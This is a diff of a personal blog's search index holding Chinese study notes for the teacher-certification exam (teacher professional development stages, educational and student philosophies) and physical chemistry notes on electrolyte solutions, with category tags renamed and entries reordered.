-<h3 id="三-教师的发展"><a href="#三-教师的发展" class="headerlink" title="三.教师的发展"></a>三.教师的发展</h3><ul>
-<li><p>教师专业发展的三阶段理论(福勒和布朗提出)</p>
-<ol>
-<li>关注生存阶段(关注人际关系,看重领导,同事,学生心目中的地位)</li>
-<li>关注情景阶段(关注成绩,提高教学质量和班级管理)</li>
-<li>关注学生阶段(关注差异,因材施教)</li>
-</ol>
-</li>
-<li><p>“自我更新”取向的教师专业发展阶段理论(叶澜和白益民提出，叶澜-中国著名教育家，华东师范大学教育学终身教授)</p>
-<ol>
-<li>非关注阶段(进入师范院校学习之前)</li>
-<li>虚拟关注阶段(进入师范院校学习期间;在情境模拟中而非真实的教学场景中)</li>
-<li>生存关注阶段(关注自己的生存适应、关注他人对自我的评价,会不自觉地把大量的时间放在与同事、学生的关系处理上)</li>
-<li>任务关注阶段(焦点集中在教学任务上,关注学生的成绩,自己教的好不好,怎么才能教好学生)</li>
-<li>自我更新关注阶段(最大程度的自我发展;关注学生的整体发展)</li>
-</ol>
-</li>
-</ul>
-<h3 id="四-教师专业发展的内容"><a href="#四-教师专业发展的内容" class="headerlink" title="四.教师专业发展的内容"></a>四.教师专业发展的内容</h3><ul>
-<li><p>专业知识素养</p>
-<ol>
-<li>通识性知识(广博的科学文化知识)[关键词: 上知天文下知地理]</li>
-<li>本体性知识(任教的学科知识)[关键词: 本职专业学科知识]</li>
-<li>条件性知识(教育科学知识)[关键词: 教育学、心理学知识]</li>
-<li>实践性知识(教学法)[关键词:实际课堂情境，具体怎么教的知识]</li>
-</ol>
-</li>
-<li><p>反思教学经验(经验＋反思&#x3D;成长)</p>
-</li>
-<li><p>终身学习意识</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>教资考试</category>
-      </categories>
-      <tags>
-        <tag>教资考试</tag>
-        <tag>综合素质</tag>
-        <tag>职业理念</tag>
       </tags>
   </entry>
   <entry>
@@ -990,12 +1177,229 @@
 <hr>
 ]]></content>
       <categories>
-        <category>教资考试</category>
+        <category>教资学习</category>
       </categories>
       <tags>
         <tag>教资考试</tag>
         <tag>资料</tag>
         <tag>背诵</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>物理化学-电解质溶液</title>
+    <url>/chenyang-tnt/posts/70eb842b/</url>
+    <content><![CDATA[<h1 id="一-电化学的基本概念和电解定律"><a href="#一-电化学的基本概念和电解定律" class="headerlink" title="一.电化学的基本概念和电解定律"></a>一.电化学的基本概念和电解定律</h1><h2 id="第一类导体"><a href="#第一类导体" class="headerlink" title="第一类导体"></a>第一类导体</h2><ol>
+<li><p>自由电子定向移动而导电</p>
+</li>
+<li><p>温度升高，电阻也升高</p>
+</li>
+<li><p>导电总量全部由电子承担</p>
+</li>
+</ol>
+<h2 id="第二类导体"><a href="#第二类导体" class="headerlink" title="第二类导体"></a>第二类导体</h2><ol>
+<li><p>正、负离子作反向移动而导电</p>
+</li>
+<li><p>温度升高，电阻下降</p>
+</li>
+<li><p>导电总量分别由正、负离子分担</p>
+</li>
+</ol>
+<h2 id="原电池和电解池的区别"><a href="#原电池和电解池的区别" class="headerlink" title="原电池和电解池的区别"></a>原电池和电解池的区别</h2><table><tbody><tr><td colspan="1" rowspan="1" colwidth="100"><p style=""></p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">原电池</p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">电解池</p></td></tr><tr><td colspan="1" rowspan="1" colwidth="100"><p style="">正极</p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">阴极</p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">阳极</p></td></tr><tr><td colspan="1" rowspan="1" colwidth="100"><p style="">负极</p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">阳极</p></td><td colspan="1" rowspan="1" colwidth="100"><p style="">阴极</p></td></tr><tr><td colspan="1" rowspan="1" colwidth="100"><p style="">阳极（失电子）</p></td><td colspan="2" rowspan="1" colwidth="100"><p style="">氧化反应</p></td></tr><tr><td colspan="1" rowspan="1" colwidth="100"><p style="">阴极（得电子）</p></td><td colspan="2" rowspan="1" colwidth="100"><p style="">还原反应</p></td></tr></tbody></table>
+
+<h1 id="二-法拉第定律"><a href="#二-法拉第定律" class="headerlink" title="二.法拉第定律"></a>二.法拉第定律</h1><p>todo：</p>
+<ol>
+<li><p>Q：通过的电量</p>
+</li>
+<li><p>Z：得失电子数</p>
+</li>
+<li><p>n：发生反应的物质的量</p>
+</li>
+<li><p>F：达拉第常数（96500C&#x2F;mol）</p>
+</li>
+<li><p>I：电流</p>
+</li>
+<li><p>t：时间</p>
+</li>
+</ol>
+<h1 id="三-离子的电迁移和迁移数"><a href="#三-离子的电迁移和迁移数" class="headerlink" title="三.离子的电迁移和迁移数"></a>三.离子的电迁移和迁移数</h1><h2 id="离子的电迁移率-r-公式："><a href="#离子的电迁移率-r-公式：" class="headerlink" title="离子的电迁移率(r)公式："></a>离子的电迁移率(r)公式：</h2><p>todo：</p>
+<h2 id="离子的电迁数-t-公式："><a href="#离子的电迁数-t-公式：" class="headerlink" title="离子的电迁数(t)公式："></a>离子的电迁数(t)公式：</h2><h1 id="四-电导"><a href="#四-电导" class="headerlink" title="四.电导"></a>四.电导</h1><h2 id="电导-G-、电导率-K-、摩尔电导率-Am"><a href="#电导-G-、电导率-K-、摩尔电导率-Am" class="headerlink" title="电导(G)、电导率(K)、摩尔电导率(Am)"></a>电导(G)、电导率(K)、摩尔电导率(Am)</h2><ol>
+<li><p>G&#x3D;1&#x2F;R</p>
+</li>
+<li><p>G&#x3D;K*(A&#x2F;l)</p>
+</li>
+<li><p>Am&#x3D;K&#x2F;c</p>
+</li>
+</ol>
+<h2 id="电导率和浓度的关系"><a href="#电导率和浓度的关系" class="headerlink" title="电导率和浓度的关系"></a>电导率和浓度的关系</h2><p>随着浓度的提高，先增大后减小</p>
+<h2 id="摩尔电导率与浓度的关系"><a href="#摩尔电导率与浓度的关系" class="headerlink" title="摩尔电导率与浓度的关系"></a>摩尔电导率与浓度的关系</h2><p>随着浓度的提高逐渐降低</p>
+<h2 id="归纳"><a href="#归纳" class="headerlink" title="归纳"></a>归纳</h2><ol>
+<li><p>电导和电阻成反比；电导率和电阻率成反比；</p>
+</li>
+<li><p>溶液的浓度越稀，摩尔电导率越大</p>
+</li>
+<li><p>电导的测定装置必须带有电阻</p>
+</li>
+<li><p>电导率随着浓度的升高，先增大后减小</p>
+</li>
+<li><p>摩尔电导率随着浓度的升高逐渐减小</p>
+</li>
+</ol>
+<h1 id="五-电解质的平均活度和平均活度因子"><a href="#五-电解质的平均活度和平均活度因子" class="headerlink" title="五.电解质的平均活度和平均活度因子"></a>五.电解质的平均活度和平均活度因子</h1>]]></content>
+      <categories>
+        <category>综合学习</category>
+      </categories>
+      <tags>
+        <tag>临时抱拂脚</tag>
+        <tag>物理化学</tag>
+        <tag>期末考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>综合素质-职业观念</title>
+    <url>/chenyang-tnt/posts/4d4b3e5e/</url>
+    <content><![CDATA[<h2 id="教育观"><a href="#教育观" class="headerlink" title="教育观"></a>教育观</h2><h3 id="一-素质教育的基本内涵-口诀-提速个性创两全"><a href="#一-素质教育的基本内涵-口诀-提速个性创两全" class="headerlink" title="一.素质教育的基本内涵(口诀:提速个性创两全)"></a>一.素质教育的基本内涵(口诀:提速个性创两全)</h3><ul>
+<li>素质教育是以提高<font color=blue><strong>国民素质</strong></font>为根本宗旨</li>
+<li>素质教育是面向<font color=blue><strong>全体学生</strong></font>的教育</li>
+<li>素质教育是促进学生<font color=blue><strong>全面发展</strong></font>的教育</li>
+<li>素质教育是促进学生<font color=blue><strong>个性发展</strong></font>的教育</li>
+<li>素质教育是以培养学生的<font color=blue><strong>创新精神</strong></font>和<font color=blue><strong>实践能力</strong></font>为重点的教育</li>
+</ul>
+<h3 id="二-新课标改革的教学观-口诀-学习过人"><a href="#二-新课标改革的教学观-口诀-学习过人" class="headerlink" title="二.新课标改革的教学观(口诀:学习过人)"></a>二.新课标改革的教学观(口诀:学习过人)</h3><ul>
+<li>教学从”<strong>教育者为中心</strong>“转向”<strong>学习者为中心</strong>“</li>
+<li>教学从”<strong>教会学生知识</strong>“转向”<strong>教会学生学习</strong>“</li>
+<li>教学从”<strong>重结论轻过程</strong>“<strong>转向”重结论更重过程</strong>“</li>
+<li>教学从”<strong>关注学科</strong>“转向”<strong>关注人</strong>“</li>
+</ul>
+<h3 id="三-素质教育与应试教育的区别"><a href="#三-素质教育与应试教育的区别" class="headerlink" title="三.素质教育与应试教育的区别"></a>三.素质教育与应试教育的区别</h3><table>
+<thead>
+<tr>
+<th align="center">类别</th>
+<th align="center">素质教育</th>
+<th align="center">应试教育</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">教学方法</td>
+<td align="center">启发式、探究式教学，使学生生动、活泼主动地学习，减轻学生课业负担</td>
+<td align="center">以死记硬背和机械重复训练为主，使学生课业负担过重</td>
+</tr>
+<tr>
+<td align="center">学生评价</td>
+<td align="center">发展性评价，评价方式多元，评价主体多元</td>
+<td align="center">筛选性评价，以考试成绩作为评价学习的主要标准甚至唯一标准</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="学生观"><a href="#学生观" class="headerlink" title="学生观"></a>学生观</h2><h3 id="一-”以人为本”的学生观"><a href="#一-”以人为本”的学生观" class="headerlink" title="一.”以人为本”的学生观"></a>一.”以人为本”的学生观</h3><ul>
+<li><p>学生是具有独立意义的主体,是不以教师意志为转移的客观存在。</p>
+<ol>
+<li>每个学生都是独立与教师头脑之外的，不以教师的意志为转移的客观存在</li>
+<li>学生是学习的主体</li>
+<li>学生是责权的主体</li>
+</ol>
+</li>
+<li><p>学生是独特的人，具有自身的独特性。</p>
+<ol>
+<li>学生是完整的人（要把学生当作完整的人来对待，给予学生全面展现个性力量的时间和空间）</li>
+<li>每个学生都有自身的独特性（关键字：因材施教）</li>
+<li>学生与成人之间存在巨大的差异（要做到换位思考）</li>
+</ol>
+</li>
+<li><p>学生是发展的人，具有巨大的发展潜能。</p>
+<ol>
+<li>学生的身心发展是有规律的（教育活动要依据学生的身心发展来开展）</li>
+<li>学生具有巨大的发展潜能</li>
+<li>学生是处于发展过程中的人（我们要理解学生存在的不足，理解学生犯的错误）</li>
+</ol>
+</li>
+</ul>
+<h3 id="二-个体身心发展的一般规律"><a href="#二-个体身心发展的一般规律" class="headerlink" title="二.个体身心发展的一般规律"></a>二.个体身心发展的一般规律</h3><ul>
+<li>个体身心发展具有顺序性</li>
+<li>个体身心发展的阶段性</li>
+<li>个体身心发展的不平衡性</li>
+<li>个体身心发展的互补性</li>
+<li>个体身心发展的个别差异性</li>
+</ul>
+<hr>
+<h2 id="教师观"><a href="#教师观" class="headerlink" title="教师观"></a>教师观</h2><h3 id="一-现代教师角色转换-口诀-见醋放盐"><a href="#一-现代教师角色转换-口诀-见醋放盐" class="headerlink" title="一.现代教师角色转换(口诀:见醋放盐)"></a>一.现代教师角色转换(口诀:见醋放盐)</h3><ul>
+<li>教师是学生学习的引导者和学生发展的促进者</li>
+<li>教师是课程的建设者和开发者</li>
+<li>教师是教育教学的研究者和反思的实践者</li>
+<li>教师是社区型的开放的教师</li>
+</ul>
+<h3 id="二-教师职业特点"><a href="#二-教师职业特点" class="headerlink" title="二.教师职业特点"></a>二.教师职业特点</h3><ul>
+<li><p>复杂性</p>
+<ol>
+<li>教育目的的全面性:[关键词: 目的是培养德智体美劳全面发展而非单一发展的人]</li>
+<li>教育任务的多样性:[关键词:不仅教书还要育人，不仅教知识、发展智力还要培养思想道德保证身心健康]</li>
+</ol>
+</li>
+<li><p>创造性</p>
+<ol>
+<li>因材施教，[关键词:一把钥匙开一把锁，扬长避短、长善救失];</li>
+<li>教学方法上不断更新:[关键词: 教学需要随时代随科技不断变化];</li>
+<li>教师需要教育机智。[关键词: 随机应变、应对突发状况]</li>
+</ol>
+</li>
+<li><p>主体性和示范性</p>
+<ol>
+<li>主体性:[关键词:言传身教];</li>
+<li>示范性:言行举止都会言行学生的发展.</li>
+</ol>
+</li>
+<li><p>劳动时间的延续性和劳动空间的广延性</p>
+<ol>
+<li>劳动时间的延续性[关键词:从早忙到晚];</li>
+<li>劳动空间的广延性[关键词:从校内到校外].</li>
+</ol>
+</li>
+<li><p>长期性和间接性</p>
+<ol>
+<li>长期性:[关键例子:十年树木百年树人];</li>
+<li>间接性:[;关键词:教师的劳动通过学生的成就实现].</li>
+</ol>
+</li>
+</ul>
+<h3 id="三-教师的发展"><a href="#三-教师的发展" class="headerlink" title="三.教师的发展"></a>三.教师的发展</h3><ul>
+<li><p>教师专业发展的三阶段理论(福勒和布朗提出)</p>
+<ol>
+<li>关注生存阶段(关注人际关系,看重领导,同事,学生心目中的地位)</li>
+<li>关注情景阶段(关注成绩,提高教学质量和班级管理)</li>
+<li>关注学生阶段(关注差异,因材施教)</li>
+</ol>
+</li>
+<li><p>“自我更新”取向的教师专业发展阶段理论(叶澜和白益民提出，叶澜-中国著名教育家，华东师范大学教育学终身教授)</p>
+<ol>
+<li>非关注阶段(进入师范院校学习之前)</li>
+<li>虚拟关注阶段(进入师范院校学习期间;在情境模拟中而非真实的教学场景中)</li>
+<li>生存关注阶段(关注自己的生存适应、关注他人对自我的评价,会不自觉地把大量的时间放在与同事、学生的关系处理上)</li>
+<li>任务关注阶段(焦点集中在教学任务上,关注学生的成绩,自己教的好不好,怎么才能教好学生)</li>
+<li>自我更新关注阶段(最大程度的自我发展;关注学生的整体发展)</li>
+</ol>
+</li>
+</ul>
+<h3 id="四-教师专业发展的内容"><a href="#四-教师专业发展的内容" class="headerlink" title="四.教师专业发展的内容"></a>四.教师专业发展的内容</h3><ul>
+<li><p>专业知识素养</p>
+<ol>
+<li>通识性知识(广博的科学文化知识)[关键词: 上知天文下知地理]</li>
+<li>本体性知识(任教的学科知识)[关键词: 本职专业学科知识]</li>
+<li>条件性知识(教育科学知识)[关键词: 教育学、心理学知识]</li>
+<li>实践性知识(教学法)[关键词:实际课堂情境，具体怎么教的知识]</li>
+</ol>
+</li>
+<li><p>反思教学经验(经验＋反思&#x3D;成长)</p>
+</li>
+<li><p>终身学习意识</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>教资学习</category>
+      </categories>
+      <tags>
+        <tag>综合素质</tag>
+        <tag>教资考试</tag>
+        <tag>职业理念</tag>
       </tags>
   </entry>
   <entry>
@@ -1048,17 +1452,12 @@
 </ol>
 ]]></content>
       <categories>
-        <category>教资考试</category>
+        <category>教资学习</category>
       </categories>
       <tags>
-        <tag>教资考试</tag>
         <tag>综合素质</tag>
+        <tag>教资考试</tag>
         <tag>职业道德</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>物理化学-电解质溶液</title>
-    <url>/chenyang-tnt/posts/70eb842b/</url>
-    <content><![CDATA[]]></content>
   </entry>
 </search>
